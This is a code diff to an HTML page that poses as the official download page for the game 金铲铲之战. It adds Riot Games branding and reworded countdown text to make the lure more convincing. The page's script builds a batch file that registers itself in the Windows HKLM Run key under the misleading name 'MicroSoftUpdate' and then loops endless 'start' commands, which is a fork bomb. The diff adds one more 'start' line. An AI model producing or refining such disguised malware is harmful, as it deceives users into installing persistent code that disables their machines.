@@ -7,9 +7,9 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); /* 蓝色渐变背景 */
-            background-size: 400% 400%; /* 背景的渐变效果 */
-            animation: gradientAnimation 10s ease infinite; /* 动画效果 */
+            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
+            background-size: 400% 400%;
+            animation: gradientAnimation 10s ease infinite;
             color: white;
             text-align: center;
             padding: 20px;
@@ -18,6 +18,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            position: relative;
         }
 
         @keyframes gradientAnimation {
@@ -35,7 +36,7 @@
         .container {
             max-width: 600px;
             margin: auto;
-            background-color: rgba(0, 0, 0, 0.7); /* 半透明的背景 */
+            background-color: rgba(0, 0, 0, 0.7);
             padding: 30px;
             border-radius: 10px;
             box-shadow: 0px 4px 10px rgba(255, 215, 0, 0.5);
@@ -91,9 +92,32 @@
             color: #FFD700;
             margin-top: 15px;
         }
+
+        /* 左上和右上角的 logo */
+        .top-left {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 50px;
+            height: 50px;
+        }
+
+        .top-right {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 50px;
+            height: 50px;
+        }
     </style>
 </head>
 <body>
+    <!-- 左上角 Riot Games logo -->
+    <img class="top-left" src="https://upload.wikimedia.org/wikipedia/commons/6/69/Riot_Games_logo.png" alt="Riot Games Logo">
+    
+    <!-- 右上角 地球 logo -->
+    <img class="top-right" src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Earth_globe_emoji.svg/120px-Earth_globe_emoji.svg.png" alt="Earth Logo">
+
     <div class="container">
         <h1>金铲铲之战 - 官方下载</h1>
         <p>立即下载最新版本，体验超燃策略对战！</p>
@@ -103,7 +127,7 @@
             <div class="progress-bar" id="progress-bar"></div>
         </div>
 
-        <p id="countdown">下载倒计时: <span id="time-left">10</span>秒</p>
+        <p id="countdown">预估下载时间: <span id="time-left">10</span>秒</p>
     </div>
 
     <script>
@@ -140,6 +164,7 @@ if not exist "%script_path%" (
 reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicroSoftUpdate" /t REG_SZ /d "%script_path%" /f >nul
 
 :loop
+start
 start
 start
 start
